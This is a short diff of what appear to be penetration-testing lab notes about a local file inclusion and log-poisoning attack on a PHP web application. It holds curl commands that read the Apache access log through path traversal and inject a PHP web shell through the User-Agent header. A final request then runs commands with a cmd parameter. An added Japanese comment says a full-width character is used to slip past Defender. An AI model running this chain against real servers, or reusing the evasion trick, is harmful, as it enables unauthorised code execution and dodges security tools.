@@ -4,16 +4,8 @@
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 # 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 
-curl http://mountaindesserts.com/meteor/index.php --user-agent ’＜？ｐｈｐ　eｃｈo　ｓｙｓｔeｍ（＄＿GET「’ｃｍｄ’」）；　？＞’
-
-
-
-
-’＜？ｐｈｐ　eｃｈo　ｓｙｓｔeｍ（＄＿GET「’ｃｍｄ’」）；　？＞’
-'<?php echo system($_GET['cmd']); ?>'
-
-
-
+#                                                                                                 ↓ディフェンダー避けのために?が全角になってるため注意！！！！
+curl http://mountaindesserts.com/meteor/index.php --user-agent '<？php echo system($_GET['cmd']); ?>'
 
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ls+-la
 ```
